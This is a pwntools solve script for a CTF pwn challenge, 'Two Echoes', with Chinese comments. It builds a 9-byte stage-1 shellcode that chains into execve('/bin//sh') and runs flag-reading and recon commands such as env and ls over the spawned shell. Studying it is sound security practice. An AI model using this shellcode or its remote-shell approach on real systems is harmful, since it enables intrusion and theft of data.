#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
18 · 两次回响 (Two Echoes)   -- Pwn, 973 pts, 2 solves
工作区: ~/ctf-2026

------------------------------------------------------------------
二进制语义 (pwn3.c, x86-64 PIE, Full RELRO, no canary, GNU_STACK=RWE)
------------------------------------------------------------------
    init();                                        // setvbuf unbuffered
    void *p = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC,   // rwx!
                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    puts("What do you want to say ?");
    read(0, p, 9);                                 // <-- "九个字" = 9 BYTES
    void (*f)(void) = p;
    f();                                           // call rdx  (indirect, RAX=0)

所以：只有 **9 字节** shellcode 预算，但缓冲区是 RWX 的。
"两次回响" = 程序给我们两次 read：第一次 9 字节，我们的 stage-1 自己再发起第二次 read。

`call rdx` 处的寄存器 (gdb 实测)：
    rax = 0        (main: mov eax,0 紧接在 call rdx 之前)
    rdi = 0
    rsi = rdx = p  (mmap 返回的 RWX 缓冲区地址)
    rdx 之后被 main 覆盖成 p（不是 9！）

------------------------------------------------------------------
9 字节 stage-1 的两个坑
------------------------------------------------------------------
坑 1: 第二次 read 若写回 rsi(=p) 会就地覆盖正在执行的 stage-1，
      于是 `syscall` 返回后那条 `jmp rsi` 已经被改写 → SIGILL。
坑 2: 如果为了躲开坑 1 而把 rsi 前移，就必须自己设 rdx；
      而 rdx 原值是 p (≈0x7fff...)，access_ok 直接判定 EFAULT。

解法（正好 9 字节，且不依赖 rax/rdx 的初值，只要 rax==0）：

    6a 7f        push 0x7f          ; rdx = 0x7f  (127B，落在一页之内)
    5a           pop  rdx
    90 90        nop nop
    0f 05        syscall            ; read(0, rsi=p, 0x7f)  -> 就地覆盖
    90 90        nop nop            ; <-- 这两字节会被 stage-2 覆盖

第二次 read 把 stage-2 写到 p（覆盖掉 stage-1 全部 9 字节），
`syscall` 返回后 RIP = p+7，那里现在是 stage-2 的第 7~8 字节。
stage-2 前 7 字节填空隙，第 7~8 字节放 `eb 00` (jmp +0) → 落到 p+9 = 真正的 payload。

    stage-2 = [7 bytes filler] + "\\xeb\\x00" + execve("/bin//sh",0,0)

stage-1 与 stage-2 用**同一次 send** 发出，保证第二次 read 一次拿全。
------------------------------------------------------------------
用法
    python3 scripts/18-solve.py                 # 本地 ./pwn（假 flag 测试）
    python3 scripts/18-solve.py HOST PORT       # 远程
    python3 scripts/18-solve.py HOST PORT -i    # 远程 + 交互 shell
环境变量 PWN=/path/to/pwn 可覆盖本地二进制路径。
"""
import os
import re
import shutil
import stat
import sys
import tempfile
import time

from pwn import *  # noqa: F401,F403

context.arch = "amd64"
context.log_level = os.environ.get("LOG", "info")

HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT_BIN = os.path.join(HERE, "..", "firmware", "18_两次回响", "pwn")
BIN = os.environ.get("PWN", DEFAULT_BIN)

# ----------------------------------------------------------------------------
# stage-1 : 9 字节，read(0, p, 0x7f) 就地覆盖自己，返回时 RIP=p+9
#           自己把 rax/rdi 清零，不依赖 caller 的寄存器状态
#           (rsi 在 `call rdx` 时 == mmap 缓冲区地址，见文件头说明)
# ----------------------------------------------------------------------------
STAGE1 = asm(
    """
    xor  eax, eax
    xor  edi, edi
    push 0x7f
    pop  rdx
    syscall
    """
)
assert len(STAGE1) == 9, ("stage1 must be exactly 9 bytes", len(STAGE1))
assert STAGE1 == bytes.fromhex("31c031ff6a7f5a0f05"), STAGE1.hex()
assert b"\n" not in STAGE1

# ----------------------------------------------------------------------------
# stage-2 : 前 9 字节填充（正好盖住 stage-1）+ "eb 00" 跳过填充 -> 真 shellcode
# ----------------------------------------------------------------------------
SHELLCODE_SH = asm(
    """
    xor  rsi, rsi
    push rsi
    mov  rdi, 0x68732f2f6e69622f      /* "/bin//sh" */
    push rdi
    mov  rdi, rsp
    xor  rdx, rdx
    push 0x3b
    pop  rax
    syscall
    """
)
STAGE2 = b"\x90" * len(STAGE1) + b"\xeb\x00" + SHELLCODE_SH
assert len(STAGE2) <= 0x7F, ("stage2 too big for rdx=0x7f", len(STAGE2))

# 实测 (nc1.ctfplus.cn:13656, 2026-09-28): flag = /home/ctf/flag；容器 cwd 就是 /home/ctf，
# /flag 与 /flag.txt 都不存在 —— 所以把 /home/ctf/flag 放最前，且不重复 cat 同一个文件
# （旧写法里 ./flag 与 /home/*/flag 命中同一文件，会把 flag 打印两遍）。
FLAG_CMD = (
    "echo __BEGIN18__; "
    "id 2>/dev/null; "
    "cat /home/ctf/flag ./flag 2>/dev/null; "
    "cat ./flag.txt /flag /flag.txt /root/flag /root/flag.txt 2>/dev/null; "
    "echo __END18__"
)
FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,}\{[^}\s]{1,200}\}")


def find_flags(out):
    """从（已 decode 的）输出里提取 flag 形态的串，去重保序。
    用正则是为了不把 __END18__ 之类的尾巴粘到 flag 上。"""
    return list(dict.fromkeys(FLAG_RE.findall(out)))


def runnable_local_binary():
    """附件的原始文件没有 +x（且 firmware/ 只读）—— 复制一份到临时目录再跑。"""
    if os.access(BIN, os.X_OK):
        return BIN
    dst = os.path.join(tempfile.gettempdir(), "pwn18_local")
    shutil.copyfile(BIN, dst)
    os.chmod(dst, os.stat(dst).st_mode | stat.S_IXUSR)
    return dst


def start():
    """返回 (tube, mode)。argv: [host, port] 走 remote，否则本地 process。"""
    args = [a for a in sys.argv[1:] if a != "-i"]
    if len(args) >= 2:
        return remote(args[0], int(args[1])), "remote"
    return process(runnable_local_binary()), "local"


def exploit():
    interactive = "-i" in sys.argv[1:]
    p, mode = start()
    log.info("mode=%s  stage1=%s  stage2=%d bytes",
             mode, STAGE1.hex(), len(STAGE2))

    p.recvuntil(b"say ?", timeout=10)
    # 一次发出：第一次 read 精确吃 9 字节，剩下的留给 stage-1 触发的第二次 read
    p.send(STAGE1 + STAGE2)
    time.sleep(0.3)
    p.sendline(FLAG_CMD.encode())

    try:
        data = p.recvuntil(b"__END18__", timeout=8)
    except EOFError:
        data = p.recvall(timeout=2)
        log.failure("连接提前关闭 —— stage-2 未跑起来")
        print(data.decode(errors="replace"))
        return None

    out = data.decode(errors="replace")
    print(out)
    flags = find_flags(out)

    if not flags:
        # 没找到 flag 就再要一份侦察信息，方便人类判断真实路径
        log.warning("没看到 flag 形态的串，采集环境信息 ...")
        p.sendline(
            b"echo __DIAG18__; pwd; ls -la; ls -la /; ls -la /home/* 2>/dev/null; "
            b"env; cat /proc/self/mountinfo 2>/dev/null | head; echo __ENDDIAG18__"
        )
        try:
            out += p.recvuntil(b"__ENDDIAG18__", timeout=8).decode(errors="replace")
        except EOFError:
            out += p.recvall(timeout=2).decode(errors="replace")
        print(out)
        flags = find_flags(out)

    if flags:
        log.success("FLAG: %s", flags[0])
    else:
        log.warning("仍未拿到 flag —— 用 -i 交互排查")

    if interactive:
        p.interactive()
    p.close()
    return flags[0] if flags else None


if __name__ == "__main__":
    exploit()
